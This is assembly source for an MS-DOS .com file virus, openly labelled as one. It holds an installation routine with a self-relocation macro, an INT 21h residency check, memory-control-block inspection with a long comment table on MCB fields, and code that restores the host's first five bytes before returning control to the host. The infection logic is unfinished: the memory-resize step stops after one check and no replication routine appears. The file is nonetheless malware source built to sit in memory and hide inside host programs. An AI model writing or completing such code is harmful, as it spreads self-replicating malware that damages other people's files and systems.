
.model tiny
include data.asm
include Macro.asm ; the macro help Routines 
include Functions.asm  
.code
;defines where the machine code place in memory
;100H says that the machine code starts from address (offset) 100h in this segment ,For .com format the offset is always 100H
;Another example is ORG 7C00H for intel exe program format.
org 100h 
start:
   ;mov dl,'A' ; print 'A'
   ;mov ah,2h
   ;int 21h
    START:
jmp INSTALL_VIRUS ;go to the installation routine


INSTALL_VIRUS:
GetRelocation bp
;VIRUS RESIDENCY CHECK 
mov ax, nVirusID
int 21h
cmp bx, nVirusID ;virus are installed ?
je VIRUS_ALREADY_INSTALLED
;RESIZE MEMORY BLOCK 
mov ax, ds
dec ax
mov es, ax ;get MCB
;ffset Size      Description
; 00   byte   'M' 4Dh  member of a MCB chain, (not last)
;            'Z' 5Ah  indicates last entry in MCB chain
;           other values cause "Memory Allocation Failure" on exit
; 01   word   PSP segment address of MCB owner (Process Id)
;               possible values:
;               0 = free
;               8 = Allocated by DOS before first user pgm loaded
;               other = Process Id/PSP segment address of owner
; 03   word   number of paras related to this MCB (excluding MCB)
; 05   11bytes  reserved
; 08   8bytes  ASCII program name, NULL terminated if less than max
;                length (DOS 4.x+)
; 10   nbytes  first byte of actual allocated memory block
;          - to find the first MCB in the chain, use  INT 21,52
;           - DOS 3.1+ the first memory block contains the DOS data segment
;                     ie., installable drivers, buffers, etc
;               - DOS 4.x the first memory block is divided into subsegments,
;                        with their own memory control blocks; offset 0000h is the first
;                  - the 'M' and 'Z' are said to represent Mark Zbikowski
;                  - the MCB chain is often referred to as a linked list, but
;                    technically isn't
cmp byte ptr es:[0],'Z' ;is it the last MCB in the chain ?
jne CANNOT_INSTALL






CANNOT_INSTALL:
VIRUS_ALREADY_INSTALLED:
;TRANSFER CONTROL TO HOST PROGRAM 
push cs
push cs
pop ds
pop es
mov di, 100h
lea si, bp+HostBytesOld
mov cx,5 ;restore 5 bytes
rep movsb
mov bx, 100h
push bx
ret ;transfer to host program

END_OF_CODE:
end start



